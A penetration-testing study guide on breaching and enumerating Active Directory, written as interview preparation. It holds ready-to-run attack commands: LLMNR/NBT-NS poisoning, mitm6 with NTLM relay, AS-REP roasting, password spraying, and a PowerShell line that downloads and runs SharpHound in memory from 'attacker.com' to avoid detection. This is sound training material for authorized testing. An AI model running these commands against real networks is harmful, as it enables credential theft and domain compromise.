---
tags: [vapt, methodology, active-directory, interview, master-guide]
difficulty: expert
module: "Ultimate VAPT Master Guides - AD"
topic: "Master Guide - AD VAPT 01"
---

# AD VAPT 01 - Initial Breach and AD Enumeration Methodology

## Introduction
Active Directory (AD) is the centralized identity and access management framework for the vast majority of enterprise environments. The initial phase of any AD VAPT engagement determines the entire trajectory of the assessment. This master guide covers the exact methodology used by top-tier Red Teamers and Penetration Testers to go from zero access (blackbox network attachment) to acquiring initial domain user credentials, and subsequently mapping the entire Active Directory graph to identify privilege escalation paths.

## Interview Strategy: The "Assume Breach" vs "Blackbox" Narrative
When asked, *"How do you approach an Active Directory penetration test?"* during an interview, your goal is to show a structured, phased methodology rather than randomly listing tools.

**The Expert's Pitch:**
> *"My approach is strictly phased. First, I clarify the engagement type: Is it a black-box external/internal network attachment, or an 'Assume Breach' scenario where I'm provided a standard low-privileged domain account? 
> If it's a zero-knowledge internal network, my first phase is **Passive and Active Identity Gathering**—using Responder to analyze broadcast traffic for LLMNR/NBT-NS poisoning, IPv6 DNS takeover via mitm6, and querying the domain controller for AS-REP roasting without pre-authentication. Concurrently, I'll identify the password policy and perform targeted password spraying using NetExec.
> Once I have valid credentials, I transition into the **Authenticated Enumeration Phase**. This involves mapping the domain structure using LDAP, not just SMB. I use BloodHound via SharpHound or bloodhound-python to map ACLs, trusts, and delegation rights, alongside PowerView for targeted queries, always mindful of the OPSEC footprint."*

This structured answer instantly separates you from junior candidates who just say "I run BloodHound."

## Phase 1: Unauthenticated Initial Breach Vectors

### 1. Broadcast Protocol Poisoning (LLMNR / NBT-NS / MDNS)
Legacy Windows environments often rely on broadcast protocols when DNS resolution fails.

**The Methodology:**
1. Listen passively to broadcast traffic.
2. When a machine requests a non-existent hostname, spoof the response.
3. Force the victim machine to authenticate to the attacker's rogue SMB/HTTP server.
4. Capture the NetNTLMv1/v2 hash and crack it offline, or relay it.

**Execution:**
```bash
# Start Responder on your primary interface
sudo responder -I eth0 -rdw -v
```
*Note: The `-r`, `-d`, and `-w` flags ensure you answer NetBIOS, DHCP, and WPAD queries.*

### 2. IPv6 DNS Takeover (mitm6)
Modern Windows systems prefer IPv6 over IPv4. By default, Windows machines periodically query for an IPv6 DHCP server.

**The Methodology:**
1. Reply to DHCPv6 messages.
2. Provide an attacker-controlled IPv6 IP as the primary DNS server.
3. When the victim queries for the WPAD configuration, direct them to an attacker server to capture credentials or relay them.

**Execution:**
```bash
# Terminal 1: Start mitm6 targeting the domain
sudo mitm6 -d targetdomain.local

# Terminal 2: Setup an NTLM relay or capture
sudo ntlmrelayx.py -6 -t ldap://<DC_IP> -wh attacker-wpad -l lootdir/
```

### 3. AS-REP Roasting (No Pre-Auth)
If a user account has `Do not require Kerberos preauthentication` enabled, an attacker can request an Authentication Service (AS) response for that user. The DC will return an AS-REP ticket containing a chunk of data encrypted with the user's password.

**Execution:**
```bash
# Using NetExec (formerly CrackMapExec)
nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt

# Using Impacket
GetNPUsers.py targetdomain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip <DC_IP>
```

### 4. Password Spraying
Identifying a large list of domain users (via RID cycling or anonymous LDAP binding) allows for password spraying.

**Execution:**
```bash
# Enumerate users via RID Cycling (null session)
nxc smb <DC_IP> -u '' -p '' --rid-brute 5000

# Perform Password Spraying (Be mindful of lockout policies!)
nxc smb <DC_IP> -u users.txt -p 'Winter2024!' --continue-on-success
```

---

## Phase 2: Authenticated Enumeration (Assume Breach)

Once a valid set of credentials (or a SYSTEM shell on a domain-joined machine) is acquired, the goal shifts to mapping the Active Directory terrain. 

### 1. BloodHound & Graph Theory
BloodHound uses graph theory to reveal the hidden and often unintended relationships within AD. It maps out Users, Groups, Computers, ACLs, Trusts, GPOs, and Kerberos Delegation.

**The Tools:**
*   **SharpHound (C# / .NET):** Best for running on Windows systems. Uses native Windows APIs.
*   **bloodhound-python:** Best for running from a Linux attacker machine. Uses LDAP and RPC.

**Execution (Linux to AD):**
```bash
bloodhound-python -u 'jdoe' -p 'Password123' -d targetdomain.local -dc targetdomain.local -c All --zip
```

**Execution (Windows via memory injection):**
```powershell
# Bypassing AMSI/Disk by loading SharpHound directly into memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\
```

### 2. Deep Dive Enumeration with PowerView / PowerSploit
PowerView is the ultimate AD enumeration tool. It uses ADSI (Active Directory Service Interfaces) and raw LDAP queries, bypassing the need for the RSAT AD tools.

**Crucial PowerView Commands:**
| Command | Purpose | Interview Talking Point |
|---------|---------|-------------------------|
| `Get-DomainUser -PreauthNotRequired` | AS-REP Roasting | Finding users explicitly misconfigured. |
| `Get-DomainUser -SPN` | Kerberoasting | Locating service accounts with SPNs linked to them. |
| `Get-DomainGroupMember -Identity "Domain Admins"`| High-value targets | Always map the exact members of high privilege groups. |
| `Get-DomainComputer -Unconstrained` | Delegation hunting | Finding pivot machines that store forwarded TGTs. |
| `Get-DomainObjectAcl -SearchBase "LDAP://..."` | ACL Auditing | Looking for `GenericAll` or `WriteDacl` permissions. |

### 3. Native Living off the Land (LotL) Techniques
In heavily monitored EDR environments, dropping tools like SharpHound triggers immediate alerts. Knowing how to use built-in tools is a hallmark of an expert.

**Using Native LDAP Search:**
```powershell
# Using ADSI to find all Domain Admins without dropping any executables
$searcher = [adsisearcher]"(memberOf=CN=Domain Admins,CN=Users,DC=targetdomain,DC=local)"
$searcher.FindAll() | % { $_.Properties.name }
```

---

## Custom ASCII Attack Diagram

```text
      [Attacker Machine]
             |
             | (1) Listen on eth0
             v
       [Responder] <====================================+
             ^                                          |
             | (2) Spoofed LLMNR/NBT-NS Response        | (3) NTLMv2 Hash
             |     "I am FileServer01"                  |
             v                                          |
    [Victim Workstation] ===============================+
     (Typo in UNC Path: \\FileSrver01)

             |
             | (4) Hashcat / John The Ripper (Offline Crack)
             v
     [Cleartext Password: "Password123!"]
             |
             | (5) bloodhound-python -u jdoe -p 'Password123!'
             v
     [Active Directory Domain Controller]
             |
             | (6) LDAP Queries (ACLs, Users, Groups)
             v
    [BloodHound Output (ZIP file)] ---> [Neo4j Graph Database for Path Analysis]
```

---

## Real-World Attack Scenario

**The Setup:** A client requested an internal penetration test. The tester was given an Ethernet port in a conference room with zero network credentials (Blackbox).
**The Execution:**
1. The tester plugged in, received a DHCP IP, and launched `Responder`.
2. Within 15 minutes, a network administrator mistyped a server name `\\BACKUP-SRV01` instead of `\\BACKUPSRV01`.
3. `Responder` caught the LLMNR query, spoofed the response, and captured the administrator's NetNTLMv2 hash.
4. The tester cracked the hash offline using `hashcat` (Hashcat mode 5600) using the `rockyou.txt` dictionary, revealing the password `Summer2023!`.
5. With these credentials, the tester used `NetExec` to verify the account wasn't locked and had `Admin` rights over several workstations.
6. The tester executed `bloodhound-python` to map the domain, discovering this admin account had `GenericAll` privileges over the `HelpDesk` group, paving the way for the next phase of the attack.

## Chaining Opportunities
*   **Responder to NTLM Relaying:** If the NetNTLMv2 hash is uncrackable, the authentication attempt can be relayed directly using `ntlmrelayx.py` to another machine where SMB signing is disabled (See [[Master Guide - AD VAPT 03]]).
*   **Enumeration to PrivEsc:** Discovering accounts with `SPN`s during the AD mapping phase leads directly into Kerberoasting (See [[Master Guide - AD VAPT 03]]).
*   **BloodHound to ACL Abuse:** Finding a `WriteDacl` permission allows the attacker to give themselves full control over a target user, leading to DCSync attacks (See [[Master Guide - AD VAPT 04]]).

## Related Notes
*   [[Master Guide - AD VAPT 02]] - Credential Harvesting and Local Privilege Escalation
*   [[Master Guide - AD VAPT 03]] - Exploiting NTLM Relays and Kerberos Flaws
*   [[Master Guide - AD VAPT 04]] - Domain Privilege Escalation DCSync DCShadow
*   [[Hashcat Cracking Cheatsheet]]
*   [[Living off the Land Binaries (LOLBas)]]

---
**End of File**
